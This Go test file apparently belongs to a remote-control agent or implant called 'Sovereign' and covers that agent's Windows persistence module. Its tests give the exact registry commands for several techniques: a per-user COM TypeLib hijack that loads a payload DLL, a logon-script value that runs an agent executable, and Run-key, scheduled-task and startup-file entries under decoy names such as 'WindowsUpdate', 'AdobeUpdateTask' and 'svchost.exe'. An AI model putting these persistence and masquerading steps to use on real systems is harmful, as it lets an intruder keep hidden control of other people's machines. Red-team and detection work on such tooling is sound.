package main

import (
	"errors"
	"reflect"
	"testing"
)

func TestPersistenceAddPlanTypeLib(t *testing.T) {
	dll := `C:\Program Files\Contoso\payload.dll`
	plan, err := persistenceAddPlan("typelib", dll)
	if err != nil {
		t.Fatal(err)
	}
	want := [][]string{
		{"add", typeLibBaseKey + `\0\win32`, "/ve", "/t", "REG_SZ", "/d", dll, "/f"},
		{"add", typeLibBaseKey + `\0\win64`, "/ve", "/t", "REG_SZ", "/d", dll, "/f"},
		{"add", typeLibBaseKey, "/v", "FLAGS", "/t", "REG_SZ", "/d", "2", "/f"},
		{"add", typeLibBaseKey, "/v", "HELPDIR", "/t", "REG_SZ", "/d", `C:\Program Files\Contoso`, "/f"},
	}
	got := make([][]string, 0, len(plan))
	for _, step := range plan {
		got = append(got, step.Args)
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("typelib plan:\n got %#v\nwant %#v", got, want)
	}
}

func TestPersistenceAddPlanKeepsPayloadArgIntact(t *testing.T) {
	// The server rejects '|' in the path, but the agent must never rejoin args
	// into a shell string: a future refactor would silently write a different
	// registry value when the path contains one.
	path := `C:\odd|path\payload.dll`
	for _, method := range []string{"typelib", "logon_script"} {
		plan, err := persistenceAddPlan(method, path)
		if err != nil {
			t.Fatal(err)
		}
		found := false
		for _, step := range plan {
			for _, arg := range step.Args {
				if arg == path {
					found = true
				}
			}
		}
		if !found {
			t.Fatalf("%s plan did not carry %q as one argv element: %#v", method, path, plan)
		}
	}
}

func TestPersistenceAddPlanLogonScript(t *testing.T) {
	plan, err := persistenceAddPlan("logon_script", `C:\ProgramData\agent.exe`)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"add", logonScriptKey, "/v", logonScriptName, "/t", "REG_SZ", "/d", `C:\ProgramData\agent.exe`, "/f"}
	if len(plan) != 1 || !reflect.DeepEqual(plan[0].Args, want) {
		t.Fatalf("logon_script plan: got %#v, want one step %#v", plan, want)
	}
}

func TestPersistencePlansRejectMissingAndUnknown(t *testing.T) {
	for _, method := range []string{"typelib", "logon_script"} {
		if _, err := persistenceAddPlan(method, ""); err == nil {
			t.Fatalf("%s accepted an empty payload", method)
		}
	}
	for _, fn := range []func(string) ([]persistenceRegCommand, error){persistenceRemovePlan} {
		if _, err := fn("registry"); err == nil {
			t.Fatal("remove plan claimed a method it does not own")
		}
	}
	if _, err := persistenceAddPlan("registry", "x"); err == nil {
		t.Fatal("add plan claimed a method it does not own")
	}
}

func TestPersistenceRemovePlan(t *testing.T) {
	typelib, err := persistenceRemovePlan("typelib")
	if err != nil {
		t.Fatal(err)
	}
	wantKey := `HKCU\Software\Classes\TypeLib\` + typeLibGUID
	if len(typelib) != 1 || !reflect.DeepEqual(typelib[0].Args, []string{"delete", wantKey, "/f"}) {
		t.Fatalf("typelib remove: %#v", typelib)
	}
	logon, err := persistenceRemovePlan("logon_script")
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"delete", logonScriptKey, "/v", logonScriptName, "/f"}
	if len(logon) != 1 || !reflect.DeepEqual(logon[0].Args, want) {
		t.Fatalf("logon_script remove: %#v", logon)
	}
}

func TestPersistenceListQuery(t *testing.T) {
	key, value, ok := persistenceListQuery("typelib")
	if !ok || key != typeLibBaseKey+`\0\win32` || value != "" {
		t.Fatalf("typelib query: %q %q %v", key, value, ok)
	}
	key, value, ok = persistenceListQuery("logon_script")
	if !ok || key != logonScriptKey || value != logonScriptName {
		t.Fatalf("logon_script query: %q %q %v", key, value, ok)
	}
	if _, _, ok := persistenceListQuery("registry"); ok {
		t.Fatal("list query claimed a method it does not own")
	}
}

func TestWindowsDir(t *testing.T) {
	cases := map[string]string{
		`C:\ProgramData\agent.exe`: `C:\ProgramData`,
		`C:\agent.exe`:             `C:\`,
		`agent.exe`:                ".",
		`/opt/tools/agent`:         "/opt/tools",
	}
	for in, want := range cases {
		if got := windowsDir(in); got != want {
			t.Errorf("windowsDir(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestPersistenceNamesCoverBothInstallSchemes(t *testing.T) {
	cases := []struct {
		kind   string
		prefix string
		want   []string
	}{
		{"registry_run", "Sovereign", []string{"WindowsUpdate", "Sovereign"}},
		{"scheduled_task", "Sovereign", []string{"AdobeUpdateTask", "SovereignUpdate"}},
		{"startup_file", "Sovereign", []string{"svchost.exe", "Sovereign.exe"}},
	}
	for _, c := range cases {
		got := persistenceNames(c.kind, c.prefix)
		if !reflect.DeepEqual(got, c.want) {
			t.Errorf("%s: got %#v, want %#v", c.kind, got, c.want)
		}
	}
	// A custom prefix that collides with a legacy name must not produce a
	// duplicate reg query / remove step.
	if got := persistenceNames("registry_run", "WindowsUpdate"); !reflect.DeepEqual(got, []string{"WindowsUpdate"}) {
		t.Fatalf("dedup: %#v", got)
	}
	if got := persistenceNames("unknown", "Sovereign"); got != nil {
		t.Fatalf("unknown kind: %#v", got)
	}
}

func TestCommandFoundIgnoresErrorOutput(t *testing.T) {
	if commandFound([]byte("ERROR: The system was unable to find the specified registry key or value."), errors.New("exit status 1")) {
		t.Fatal("a failed reg query must not report a persistence entry as found")
	}
	if !commandFound([]byte("HKEY_CURRENT_USER\\Software\\...\r\n    WindowsUpdate    REG_SZ\r\n"), nil) {
		t.Fatal("a successful query with output must report found")
	}
	if commandFound([]byte("  \r\n\t"), nil) {
		t.Fatal("whitespace-only output is not evidence")
	}
}
